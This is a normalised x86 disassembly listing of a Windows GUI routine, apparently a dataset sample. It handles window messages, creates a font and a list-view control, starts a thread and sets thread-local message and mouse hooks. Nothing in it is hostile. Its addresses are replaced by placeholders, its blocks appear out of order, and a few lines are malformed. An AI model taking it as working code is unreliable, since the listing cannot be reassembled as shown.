push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
mov edi [ rw-data ]
test edi edi
je r-xdata
xor eax eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
cmp [ esp + 0x98 ] 0x10
mov eax [ esp + 0x84 ]
mov [ esp + 0x2f0 ] 0x6
jae r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
cmp esi edx
jae r-xdata
mov edx [ rw-data ]
push edx
lea ecx [ esp + 0x58 ]
push ecx
push eax
lea ecx [ esp + 0x240 ]
call sub_403030
lea edx [ esp + 0x234 ]
push edx
mov [ esp + 0x2f4 ] 0x7
mov [ esp + 0x25c ] ebx
call sub_4090d0
add esp 0x4
test eax eax
jne r-xdata
lea eax [ esp + 0x84 ]
push 0xffffffff
lea eax [ edi + ebp ]
push 0x0
push eax
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc8 ] 0xf
mov [ esp + 0xc4 ] 0x0
mov [ esp + 0xb4 ] 0x0
call sub_401dd0
mov [ esp + 0xc0 ] esi
push 0xffffffff
push 0x0
lea edx [ esp + 0xac ]
push edx
lea ecx [ esp + 0x11c ]
mov [ esp + 0x2fc ] 0x4
mov [ esp + 0x134 ] 0xf
mov [ esp + 0x130 ] 0x0
mov [ esp + 0x120 ] 0x0
call sub_401dd0
mov eax [ esp + 0xc0 ]
mov [ esp + 0x12c ] eax
lea ecx [ esp + 0x110 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x50 ]
mov [ esp + 0x2f8 ] 0x5
call sub_46bb20
cmp [ esp + 0x128 ] 0x10
jb r-xdata
lea ecx [ esp + 0x234 ]
call sub_401a00
mov esi [ esp + 0x58 ]
xor ebx ebx
cmp esi ebx
je r-xdata
lea ecx [ esp + 0x2c ]
call sub_433b70
mov ecx [ esp + 0x58 ]
xor esi esi
xor ebp ebp
mov [ esp + 0x2f0 ] 0x8
xor edi edi
mov ebx 0xf
cmp [ esp + 0xbc ] 0x10
mov edi 0xf
mov [ esp + 0x128 ] edi
mov [ esp + 0x124 ] 0x0
mov [ esp + 0x114 ] 0x0
mov [ esp + 0x2f0 ] 0x3
jb r-xdata
mov eax [ esp + 0x114 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x4c ]
mov [ esp + 0x58 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x60 ] ebx
mov ecx [ eax ]
push eax
push ecx
lea ecx [ esp + 0x2c ]
push ecx
lea ecx [ esp + 0x54 ]
mov [ esp + 0x2fc ] 0x2
call sub_46b3f0
mov edx [ esp + 0x4c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx rw-data
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
call sub_401420
cmp [ esp + 0x78 ] ebx
je r-xdata
mov edi [ esp + 0x5c ]
cmp esi edi
je r-xdata
mov esi [ esp + 0x5c ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor esi esi
mov ebx 0xf
xor edx edx
jmp r-xdata
inc esi
mov [ esp + 0xbc ] edi
mov [ esp + 0xb8 ] 0x0
mov [ esp + 0xa8 ] 0x0
add ebp 0x70
jmp r-xdata
mov ecx [ esp + 0xa8 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov esi [ esp + 0x3c ]
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov ebp [ rw-data ]
mov edx 0x10
push ecx
cmp eax edx
mov eax [ rw-data ]
mov ecx esp
jae r-xdata
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_401a90
add esi 0x70
cmp esi edi
jne r-xdata
mov ecx [ esp + 0x34 ]
cmp ecx [ esp + 0x50 ]
je r-xdata
cmp [ edi + ecx + 0x18 ] 0x10
jb r-xdata
cmp ebp edx
jge r-xdata
cmp [ esp + 0x7c ] 0x10
jb r-xdata
mov ecx [ esp + 0x40 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x24 ] edx
je r-xdata
mov esi [ rw-data ]
add eax esi
mov [ ecx ] eax
push ecx
cmp [ rw-data ] edx
mov ecx [ rw-data ]
mov eax esp
jae r-xdata
mov eax rw-data
mov esi [ esp + 0x58 ]
mov ecx [ esp + 0x30 ]
mov eax [ ecx ]
cmp eax ecx
mov [ esp + 0x10 ] eax
je r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
imul eax eax 0x70
push 0xffffffff
add eax edx
push 0x0
push eax
lea ecx [ esp + 0x70 ]
call sub_401dd0
mov esi [ esp + 0x30 ]
lea edx [ esp + 0x64 ]
push edx
lea eax [ esp + 0x154 ]
push eax
lea ecx [ esp + 0x34 ]
call sub_432c60
cmp [ eax ] esi
jne r-xdata
lea ecx [ edi + ecx + 0x4 ]
mov ecx [ edi + ecx + 0x4 ]
jmp r-xdata
cmp esi ebx
mov [ esp + 0x7c ] 0xf
mov [ esp + 0x78 ] ebx
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x2f0 ] 0x0
je r-xdata
mov edx [ esp + 0x68 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov [ esp + 0x24 ] ecx
cmp eax [ rw-data ]
mov [ esp + 0x18 ] eax
je r-xdata
mov [ eax ] ecx
lea eax [ esp + 0x2c ]
push eax
mov ecx rw-data
call sub_401c60
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov eax [ esp + 0x1c ]
mov esi [ rw-data ]
mov edi [ rw-data ]
push edx
push eax
mov [ rw-data ] ecx
mov ecx [ rw-data ]
push 0x1422
push ecx
mov [ rw-data ] ebx
call [ SendMessageA@IAT ]
mov [ rw-data ] esi
mov esi [ esp + 0x3c ]
mov [ rw-data ] edi
mov [ rw-data ] ebp
jmp r-xdata
mov ecx rw-data
mov ecx [ esp + 0x30 ]
mov eax [ ecx ]
push ecx
push eax
lea edx [ esp + 0x2c ]
push edx
lea ecx [ esp + 0x38 ]
mov [ esp + 0x2fc ] 0x7
call sub_46b3f0
mov eax [ esp + 0x30 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
lea esp [ esp ]
push 0xffffffff
push 0x0
push rw-data
lea ecx [ esp + 0x70 ]
call sub_401dd0
mov ecx [ rw-data ]
mov eax [ esp + 0x34 ]
cmp ecx eax
mov [ esp + 0x1c ] ecx
jl r-xdata
push 0xffffffff
lea eax [ edi + ecx ]
push esi
push eax
lea ecx [ esp + 0xd0 ]
mov [ esp + 0xe8 ] ebx
mov [ esp + 0xe4 ] esi
mov [ esp + 0xd4 ] 0x0
call sub_401dd0
mov [ esp + 0xe0 ] ebp
push 0xffffffff
push esi
lea ecx [ esp + 0xcc ]
push ecx
lea ecx [ esp + 0x13c ]
mov [ esp + 0x2fc ] 0x9
mov [ esp + 0x154 ] ebx
mov [ esp + 0x150 ] esi
mov [ esp + 0x140 ] 0x0
call sub_401dd0
mov edx [ esp + 0xe0 ]
mov [ esp + 0x14c ] edx
lea eax [ esp + 0x130 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
lea ecx [ esp + 0x34 ]
mov [ esp + 0x2f8 ] 0xa
call sub_46bb20
cmp [ esp + 0x148 ] 0x10
jb r-xdata
mov eax [ edi + ecx + 0x40 ]
cmp eax 0x1
je r-xdata
push ecx
call sub_439280
mov ecx [ esp + 0x5c ]
add esp 0x4
cmp eax 0x7
jne r-xdata
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
jmp r-xdata
mov eax [ esp + 0xa0 ]
mov edx [ esp + 0x40 ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
push edx
push esi
call sub_402270
push esi
call j_sub_4b66ed#2
add esp 0x14
mov ecx [ esp + 0x24 ]
mov [ rw-data ] ecx
lea esp [ esp ]
xor ebx ebx
push 0xffffffff
push ebx
push esi
lea ecx [ esp + 0x100 ]
mov [ esp + 0x118 ] 0xf
mov [ esp + 0x114 ] ebx
mov [ esp + 0x104 ] bl
call sub_401dd0
mov eax [ esp + 0x4c ]
mov edi [ eax ]
cmp edi eax
mov [ esp + 0x2f0 ] 0xe
mov [ esp + 0x24 ] edi
je r-xdata
mov eax [ eax + 0x28 ]
mov edx [ rw-data ]
mov ebp eax
imul ebp ebp 0x70
mov [ esp + 0x24 ] eax
lea eax [ edx + ebp ]
push eax
lea ecx [ esp + 0x158 ]
call sub_402400
mov eax [ edi + 0x28 ]
mov esi [ esp + 0x58 ]
imul eax eax 0x70
add eax esi
push eax
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x2f4 ] 0xb
call sub_402400
mov eax [ esp + 0x17c ]
cmp eax [ esp + 0x1ec ]
mov [ esp + 0x2f0 ] 0xc
jne r-xdata
dec eax
mov [ esp + 0x1c ] eax
jmp r-xdata
cmp [ esp + 0xdc ] 0x10
mov [ esp + 0x148 ] ebx
mov [ esp + 0x144 ] esi
mov [ esp + 0x134 ] 0x0
mov [ esp + 0x2f0 ] 0x8
jb r-xdata
mov edx [ esp + 0x134 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp eax 0x2
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ rw-data ]
add eax 0x4
cmp eax ecx
mov [ esp + 0x18 ] eax
jne r-xdata
add eax 0x4
mov [ esp + 0x14 ] eax
cmp [ esp + 0x10c ] 0x10
mov [ esp + 0x2f0 ] 0x8
jb r-xdata
mov ebp [ esp + 0x30 ]
lea esi [ edi + 0xc ]
push esi
lea ecx [ esp + 0x30 ]
call sub_4614e0
cmp eax [ esp + 0x30 ]
mov [ esp + 0x18 ] eax
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
xor ebx ebx
mov [ esp + 0x14 ] ebx
lea esp [ esp ]
mov ecx [ esp + 0x180 ]
cmp ecx [ esp + 0x1f0 ]
je r-xdata
mov ecx [ esp + 0x58 ]
mov [ esp + 0xdc ] ebx
mov [ esp + 0xd8 ] esi
mov [ esp + 0xc8 ] 0x0
mov eax [ esp + 0xc8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
inc ebp
add edi 0x70
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edx ]
push 0xffffffeb
push eax
mov [ rw-data ] eax
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x40 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x3c ]
cmp eax ecx
mov [ esp + 0x1c ] eax
je r-xdata
mov esi [ esp + 0x3c ]
xor ebx ebx
mov ecx [ esp + 0x10 ]
mov ebp [ ecx + 0x3c ]
test ebp ebp
je r-xdata
mov edi [ edi ]
mov [ esp + 0x10c ] 0xf
mov [ esp + 0x108 ] ebx
mov [ esp + 0xf8 ] 0x0
mov ecx [ esp + 0xf8 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0x30 ]
mov [ esp + 0x9c ] edx
lea eax [ esp + 0x9c ]
cmp [ eax + 0x24 ] 0x10
mov ecx [ eax + 0x20 ]
jb r-xdata
mov [ esp + 0x14 ] ebx
mov eax edx
sub eax ecx
sar eax 0x2
cmp ebx eax
jae r-xdata
mov eax [ esp + 0x230 ]
mov ebx 0x10
cmp eax ebx
jb r-xdata
cmp ecx esi
jne r-xdata
cmp ebp eax
jb r-xdata
cmp ebp eax
mov ecx ebp
jb r-xdata
cmp edx [ esp + 0x30 ]
jne r-xdata
mov ecx [ edx + 0x8 ]
mov al [ ecx + 0x2d ]
test al al
jne r-xdata
mov ecx [ edi + 0x28 ]
mov eax [ rw-data ]
push 0xffffffff
cmp ecx eax
push ebx
lea ecx [ esp + 0x6c ]
jne r-xdata
lea ecx [ esp + 0x24 ]
call sub_432ab0
mov edi [ esp + 0x24 ]
cmp edi [ esp + 0x4c ]
jne r-xdata
add eax 0x10
mov eax [ eax + 0x10 ]
jmp r-xdata
mov eax [ esp + 0x1dc ]
xor esi esi
cmp eax ebx
mov edi 0xf
mov [ esp + 0x230 ] edi
mov [ esp + 0x22c ] esi
mov [ esp + 0x21c ] 0x0
jb r-xdata
mov eax [ esp + 0x21c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x24 ]
cmp eax [ esi + ebx * 4 ]
je r-xdata
cmp ebx 0x10
jb r-xdata
xor edx edx
cmp ebp eax
setne dl
test edx edx
je r-xdata
mov esi [ esp + 0x10 ]
cmp [ esi + 0x40 ] 0x10
jb r-xdata
mov ecx eax
mov edi [ esp + 0x10 ]
lea esi [ edi + 0xc ]
push esi
lea ecx [ esp + 0xa4 ]
push ecx
lea ecx [ esp + 0x50 ]
call sub_432c60
mov eax [ eax ]
cmp eax [ esp + 0x4c ]
je r-xdata
mov eax [ edx + 0x4 ]
mov cl [ eax + 0x2d ]
test cl cl
jne r-xdata
mov eax [ ecx ]
mov dl [ eax + 0x2d ]
test dl dl
jne r-xdata
mov edi [ rw-data ]
imul eax eax 0x70
add eax edi
lea eax [ esp + 0xfc ]
jmp r-xdata
jmp r-xdata
lea eax [ esp + 0x18 ]
jmp r-xdata
push ecx
mov ecx [ esi + 0x14 ]
push eax
push ecx
push ebx
mov ecx esi
call sub_401150
test eax eax
jl r-xdata
cmp [ esp + 0x1c0 ] ebx
mov [ esp + 0x1dc ] edi
mov [ esp + 0x1d8 ] esi
mov [ esp + 0x1c8 ] 0x0
mov [ esp + 0x2f0 ] 0x8
jb r-xdata
mov ecx [ esp + 0x1c8 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
lea edi [ ebx * 4 ]
mov eax [ edi + ecx ]
test eax eax
lea esi [ edi + ecx ]
mov [ esp + 0x14 ] ebx
je r-xdata
inc ebx
jmp r-xdata
mov edi [ esp + 0x14 ]
mov edx [ esp + 0x14 ]
mov edi [ edx ]
jmp r-xdata
mov eax [ esp + 0x40 ]
cmp [ esp + 0x1c ] eax
je r-xdata
add esi 0x2c
mov esi [ esi + 0x2c ]
jmp r-xdata
mov edx eax
lea esp [ esp ]
mov edx ecx
jmp r-xdata
mov edi edi
push eax
call sub_401dd0
cmp [ eax ] ebp
je r-xdata
cmp [ esp + 0x16c ] ebx
mov [ esp + 0x1c0 ] edi
mov [ esp + 0x1bc ] esi
mov [ esp + 0x1ac ] 0x0
jb r-xdata
mov edx [ esp + 0x1ac ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ esi ]
test edi edi
je r-xdata
mov eax [ eax + 0xd48 ]
cmp eax 0x1
mov [ esp + 0x18 ] eax
jle r-xdata
test ecx ecx
je r-xdata
cmp ebp eax
jb r-xdata
cmp ebp eax
mov ecx ebp
jb r-xdata
mov ecx [ esp + 0x10 ]
mov ebp [ ecx + 0xac ]
test ebp ebp
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call sub_466930
mov edx [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
push eax
call sub_466150
add esp 0x4
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov edx eax
mov eax [ eax + 0x4 ]
mov cl [ eax + 0x2d ]
test cl cl
je r-xdata
mov [ esp + 0x10 ] edx
mov ecx eax
mov eax [ ecx ]
mov dl [ eax + 0x2d ]
test dl dl
je r-xdata
mov [ esp + 0x16c ] edi
mov [ esp + 0x168 ] esi
mov [ esp + 0x158 ] 0x0
jmp r-xdata
mov eax [ esp + 0x158 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi ] 0x0
jmp r-xdata
dec [ edi + 0xd48 ]
jne r-xdata
mov ecx [ rw-data ]
xor esi esi
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x40 ]
add eax 0x1c
add edx 0x1c
cmp eax ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] edx
jne r-xdata
xor edx edx
cmp ebp eax
setne dl
test edx edx
je r-xdata
mov edx [ esp + 0x10 ]
cmp [ edx + 0xb0 ] 0x10
jb r-xdata
mov ecx eax
cmp edx [ eax + 0x8 ]
jne r-xdata
mov edx [ esp + 0x10 ]
mov al [ edx + 0x2d ]
test al al
jne r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov ecx rw-data
call sub_460310
push rw-data
lea ecx [ esp + 0xe8 ]
mov [ rw-data ] 0x0
call sub_46a670
mov eax [ esp + 0x18 ]
test eax eax
mov [ esp + 0x2f0 ] 0xd
jle r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
cmp esi eax
jae r-xdata
mov edi [ esp + 0x14 ]
mov ebx [ edi + 0x14 ]
cmp ebx 0x10
mov eax [ edi + 0x10 ]
jb r-xdata
jmp r-xdata
mov esi [ esp + 0x10 ]
add esi 0x9c
mov esi [ edx + 0x9c ]
jmp r-xdata
mov eax [ rw-data ]
mov esi [ esp + 0x24 ]
mov [ edi + eax ] 0xffffffff
mov ecx [ rw-data ]
push 0x0
mov [ ecx + ebp + 0x30 ] 0xffffffff
mov edx [ rw-data ]
push 0x0
push edx
push esi
call sub_4706c0
add esp 0x10
cmp ebx eax
jne r-xdata
mov ebx eax
jmp r-xdata
mov eax [ ecx + esi * 4 ]
test eax eax
je r-xdata
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov ecx [ rw-data ]
mov [ edi + ecx ] esi
mov ecx [ esp + 0x18 ]
test ecx ecx
jle r-xdata
lea eax [ esp + 0x154 ]
push eax
lea ecx [ esp + 0x3c ]
call sub_407460
mov edx [ rw-data ]
mov esi [ edi + edx ]
dec [ esi + 0xd48 ]
jne r-xdata
inc esi
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ rw-data ]
mov [ ecx + esi * 4 ] 0x0
mov ecx [ rw-data ]
mov ebp [ esp + 0xe8 ]
xor eax eax
cmp ebp eax
mov [ esp + 0x2f0 ] 0xc
je r-xdata
mov edx [ rw-data ]
mov eax [ edi + edx ]
mov edx [ eax + 0xd48 ]
inc edx
dec ecx
mov [ eax + 0xd48 ] edx
jne r-xdata
dec ebx
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
test ecx ecx
je r-xdata
mov [ esp + 0xe8 ] eax
mov [ esp + 0xec ] eax
mov [ esp + 0xf0 ] eax
jmp r-xdata
mov edi [ esp + 0xec ]
cmp ebp edi
mov esi ebp
je r-xdata
mov ebx [ esp + 0x14 ]
push ebp
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx esi
call sub_40b360
add esi 0x4
cmp esi edi
jne r-xdata
sub_47f920
mov eax [ esp + 0x8 ]
sub eax 0x4e
push esi
je r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax + 0x8 ]
cmp eax 0xffffff37
jne r-xdata
sub eax 0xc2
je r-xdata
cmp eax 0xffffff36
jne r-xdata
mov [ rw-data ] 0x3
mov esi [ esp + 0x8 ]
mov eax [ rw-data ]
mov ecx 0x898
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x899
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x89a
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x89e
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x89b
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x89c
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x89d
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x89f
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8a0
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8a1
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8a2
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8a3
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8a4
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8aa
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8ab
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8ac
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8ad
mov edx esi
call sub_457bf0
mov eax [ rw-data ]
mov ecx 0x8ae
mov edx esi
call sub_457bf0
mov eax 0x1
pop esi
retn 0x10
dec eax
je r-xdata
mov eax 0x1
pop esi
retn 0x10
mov esi [ esp + 0x8 ]
push ebx
push rw-data
mov eax 0x898
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x899
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x89a
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x89e
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x89b
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x89c
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x89d
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x89f
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8a0
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8a1
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8a2
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8a3
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8a4
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8aa
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8ab
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8ac
mov ecx esi
call sub_457ce0
add esp 0x40
push rw-data
mov eax 0x8ad
mov ecx esi
call sub_457ce0
push rw-data
mov eax 0x8ae
mov ecx esi
call sub_457ce0
mov eax [ rw-data ]
xor ebx ebx
add esp 0x8
cmp eax ebx
je r-xdata
mov eax [ esp + 0x8 ]
push 0x0
push eax
push 0x468
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
mov eax 0x1
pop esi
retn 0x10
xor eax eax
pop esi
retn 0x10
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
mov eax [ rw-data ]
je r-xdata
push 0xffffffff
push eax
mov [ rw-data ] 0x1
call [ WaitForSingleObject@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov [ rw-data ] ebx
mov ecx [ rw-data ]
push rw-data
push ebx
push rw-data
push sub_47e970
push ebx
push ebx
mov [ rw-data ] ecx
mov [ rw-data ] bl
call [ CreateThread@IAT ]
mov [ rw-data ] eax
jmp r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
mov esi [ UnhookWindowsHookEx@IAT ]
push eax
call esi
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push ebp
push edi
mov edi [ GetWindowThreadProcessId@IAT ]
push ebx
push esi
call edi
mov ebp [ SetWindowsHookExA@IAT ]
push eax
push ebx
push sub_45bbf0
push 0x3
call ebp
push ebx
push esi
mov [ rw-data ] eax
call edi
push eax
push ebx
push sub_45bb90
push 0x7
call ebp
pop edi
mov [ rw-data ] eax
pop ebp
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
push eax
call esi
push eax
mov ecx rw-data
call sub_421f10
mov eax [ rw-data ]
cmp eax edx
pop ebx
jge r-xdata
sub_47fd30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c10c2
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x400
sub eax 0x2
push ebx
push ebp
push esi
push edi
je r-xdata
mov edx [ rw-data ]
push edx
call [ DeleteObject@IAT ]
sub eax 0x10e
je r-xdata
mov ecx rw-data
mov [ esp + 0x68 ] ecx
call sub_404310
xor ebp ebp
push ebp
push ebp
push ebp
push ebp
push ebp
push 0x80
push ebp
push ebp
push ebp
push 0x190
push ebp
push ebp
push ebp
push 0xc
mov [ esp + 0x450 ] ebp
call [ CreateFontA@IAT ]
mov [ rw-data ] eax
mov [ esp + 0xa8 ] ebp
mov [ esp + 0xac ] ebp
mov [ esp + 0xb0 ] ebp
mov [ esp + 0x418 ] 0x1
call sub_40acb0
push eax
lea ecx [ esp + 0x2c ]
call sub_46a370
mov edi [ esp + 0x2c ]
mov [ esp + 0x418 ] 0x2
xor ebx ebx
mov esi edi
jmp r-xdata
dec eax
jne r-xdata
cmp edi ebp
jne r-xdata
xor eax eax
jmp r-xdata
movzx eax [ esp + 0x428 ]
dec eax
je r-xdata
mov eax [ esp + 0x30 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x410 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x40c
retn 0x10
mov ecx [ esp + 0x420 ]
push 0x1
push ecx
call [ EndDialog@IAT ]
jmp r-xdata
dec eax
jne r-xdata
cmp edi ebp
je r-xdata
mov eax [ esi ]
cmp [ eax ] ebp
je r-xdata
cmp ebx eax
jge r-xdata
mov eax 0x1
mov eax [ esp + 0x420 ]
push 0x2
push eax
call [ EndDialog@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx ebp
mov esi 0xf0
je r-xdata
push edi
call j_sub_4b66ed#2
add esp 0x4
inc ebx
add esi 0x4
jmp r-xdata
mov cl [ eax + 0x4 ]
test cl cl
jne r-xdata
mov ecx [ esp + 0xa8 ]
cmp ecx ebp
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
cmp eax ebp
jbe r-xdata
push esi
lea ecx [ esp + 0xa8 ]
call sub_417fb0
mov ebx [ esp + 0x420 ]
mov ebp [ GetDlgItem@IAT ]
lea edx [ esp + 0x28 ]
push edx
push 0x1
push ebx
call ebp
mov edi [ GetWindowRect@IAT ]
push eax
call edi
mov ecx [ esp + 0x30 ]
push 0x5
push 0x0
push 0x0
lea eax [ esi - 0x30 ]
push eax
mov eax [ esp + 0x38 ]
sub eax ecx
add eax 0x280
cdq
sub eax edx
sar eax 0x1
push eax
push 0x0
push 0x1
push ebx
call ebp
mov ebp [ SetWindowPos@IAT ]
push eax
call ebp
mov edx [ rw-data ]
lea ecx [ esp + 0xb4 ]
push ecx
push edx
call edi
mov edi [ esp + 0xb4 ]
mov eax [ esp + 0xbc ]
sub eax edi
sub eax 0x280
cdq
sub eax edx
mov ecx eax
mov eax [ esp + 0xc0 ]
sar ecx 0x1
add ecx edi
mov edi [ esp + 0xb8 ]
sub eax edi
sub eax esi
push 0x4
cdq
push esi
sub eax edx
push 0x280
sar eax 0x1
add eax edi
push eax
push ecx
xor edi edi
push edi
push ebx
call ebp
lea eax [ esp + 0x300 ]
push eax
push ebx
call [ GetClientRect@IAT ]
mov esi [ GetWindowLongA@IAT ]
push 0xfffffffa
push ebx
call esi
push edi
push 0xfffffffa
push ebx
mov [ esp + 0x7c ] eax
mov [ esp + 0x4c ] edi
mov [ esp + 0x50 ] edi
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] edi
mov [ esp + 0x80 ] edi
mov [ esp + 0x84 ] edi
call esi
push eax
push 0x64
push ebx
push 0xa0
push 0x26e
push 0x1e
push 0x6
push 0x50000009
push r--data
push r--data
push edi
call [ CreateWindowExA@IAT ]
mov esi [ SendMessageA@IAT ]
push edi
push edi
mov ebp eax
push 0x1037
push ebp
call esi
or eax 0x21
push eax
push edi
push 0x1036
push ebp
call esi
lea ecx [ esp + 0x48 ]
push ecx
push edi
push 0x101b
push ebp
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] 0xfa
mov [ esp + 0x64 ] r--data
mov [ esp + 0x6c ] edi
call esi
lea edx [ esp + 0x48 ]
push edx
mov edi 0x1
push edi
push 0x101b
push ebp
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] 0x50
mov [ esp + 0x64 ] r--data
mov [ esp + 0x6c ] edi
call esi
lea eax [ esp + 0x48 ]
push eax
push 0x2
push 0x101b
push ebp
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] 0x5a
mov [ esp + 0x64 ] r--data
mov [ esp + 0x6c ] 0x2
call esi
lea ecx [ esp + 0x48 ]
push ecx
push 0x3
push 0x101b
push ebp
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] 0x46
mov [ esp + 0x64 ] r--data
mov [ esp + 0x6c ] 0x3
call esi
lea edx [ esp + 0x48 ]
push edx
push 0x4
push 0x101b
xor edi edi
push ebp
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] 0x82
mov [ esp + 0x64 ] r--data
mov [ esp + 0x6c ] 0x4
call esi
mov [ esp + 0x2c ] edi
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] edi
mov ecx [ rw-data ]
mov [ esp + 0x418 ] 0x3
mov [ esp + 0x10 ] edi
nop
mov eax [ esp + 0xac ]
sub eax ecx
